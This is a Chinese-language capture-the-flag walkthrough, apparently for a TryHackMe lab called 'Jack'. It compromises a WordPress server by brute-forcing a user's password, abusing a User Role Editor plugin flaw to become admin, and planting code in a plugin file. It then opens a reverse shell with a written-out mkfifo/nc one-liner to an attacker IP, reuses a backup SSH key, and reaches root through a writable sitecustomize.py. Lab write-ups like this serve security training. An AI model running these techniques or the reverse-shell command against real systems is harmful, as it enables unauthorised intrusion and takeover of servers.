# Jack

破坏运行Wordpress的Web服务器，获得低特权用户，并使用Python模块将您的权限升级到root。

---

## 端口扫描

循例nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/39a95d0a61b2419d8fcfb0c958aab693.png)

## web枚举

![在这里插入图片描述](https://img-blog.csdnimg.cn/a532b9c4535a40afb68e9d0f372873f9.png)

robots.txt

![在这里插入图片描述](https://img-blog.csdnimg.cn/3bea36c32220414b9916523218cd21f7.png)

wpscan枚举user

![在这里插入图片描述](https://img-blog.csdnimg.cn/2e0e053ef8e848c1a787a9bf27f9c758.png)

wpscan直接爆

![在这里插入图片描述](https://img-blog.csdnimg.cn/2c5d3be347df42ccb340cb1d6f5308fd.png)

得到wendy的密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/359deab9cc964c7eb9b59e4640e36195.png)

直接登后台

![在这里插入图片描述](https://img-blog.csdnimg.cn/de85580f2b2f478f9e0f3b50f02a2b83.png)

根据题目提示，利用user role editor帮助我们在wp中提权到admin

根据exploitdb给出的desc

	v4.25 之前的 WordPress User Role Editor 插件缺少授权
	   检查其更新用户配置文件功能（“更新”功能，包含
	   在“class-user-other-roles.php”模块中）。
	   而不是验证当前用户是否有权编辑其他用户的
	   配置文件（“edit_users”WP 功能），易受攻击的函数验证是否
	   当前用户有权编辑指定的用户（“edit_user”WP 函数）
	   提供的用户 ID（“user_id”变量/HTTP POST 参数）。 由于提供
	   user id 是当前用户的 id，这个检查总是被绕过（即当前
	   始终允许用户修改其配置文件）。
	   此漏洞允许经过身份验证的用户添加任意用户角色编辑器
	   通过“ure_other_roles”参数在其配置文件中指定角色
	   对“profile.php”模块的 HTTP POST 请求（在“更新配置文件”被启用时发出）
	   点击）。
	   默认情况下，此模块授予指定的 WP 用户所有管理权限，
	   存在于用户角色编辑器插件的上下文中。

进到profile editor，然后update

![在这里插入图片描述](https://img-blog.csdnimg.cn/be89fc5f966842dcb427e62f6e227d25.png)

wp抓包添加ure_other_roles参数，放行

![在这里插入图片描述](https://img-blog.csdnimg.cn/a4c22cf31aa04b3491103634e7ccdb0b.png)

成功提权

![在这里插入图片描述](https://img-blog.csdnimg.cn/41c7afe252af412383d406bd5abac470.png)

直接往页面写一句话行不通

![在这里插入图片描述](https://img-blog.csdnimg.cn/fb938af51913405991d51cefa5ff0bc4.png)

利用插件编辑器，随便编辑个插件

![在这里插入图片描述](https://img-blog.csdnimg.cn/d148654c08974bde8887a17b33705f1d.png)

访问编辑的php文件：

	http://jack.thm/wp-content/plugins/akismet/index.php

![在这里插入图片描述](https://img-blog.csdnimg.cn/ad9d868a9b334ac5b62d3a9e56b50886.png)

reverse shell payload

	mkfifo /tmp/f1;nc 10.14.39.48 8888 < /tmp/f1 | /bin/bash > /tmp/f1

![在这里插入图片描述](https://img-blog.csdnimg.cn/9087a9d5bc7b4cafb97782211911eda4.png)

user flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/6b7d76a9f4da4382b28e2fc2d0c7c786.png)

## 横向移动

![在这里插入图片描述](https://img-blog.csdnimg.cn/a4d3696da35e4eda80fc893be5c7baa5.png)

备份文件，那么应该查看/var/backups

![在这里插入图片描述](https://img-blog.csdnimg.cn/98597c4716464afc8af91283e228b417.png)

有一个ssh私钥，估计是jack的

下到攻击机尝试利用，没密码，成功进来

![在这里插入图片描述](https://img-blog.csdnimg.cn/036d24d9cb934713b9f4ff6e090f2724.png)

## 权限提升

查找用户可写的文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/7565264c2aef45549dea6a855ad19968.png)

sitecustomize.py是一个会在python运行的时候自动执行，我们查看了定时任务，并没有

那么有可能在进程列表中给出答案，传个pspy过去

![在这里插入图片描述](https://img-blog.csdnimg.cn/6f40602f590d495ba0df21ca9c47f429.png)

定时执行python，这刚好满足了条件，编辑sitecustomize.py

![在这里插入图片描述](https://img-blog.csdnimg.cn/4416845de3dc41a7bc7a16efc024ccb4.png)

静等一会

![在这里插入图片描述](https://img-blog.csdnimg.cn/3f895497183442cc9ea10d11e7a8d19c.png)

利用

![在这里插入图片描述](https://img-blog.csdnimg.cn/9bea8d19e72f4ae5a9b96281581a7946.png)

getroot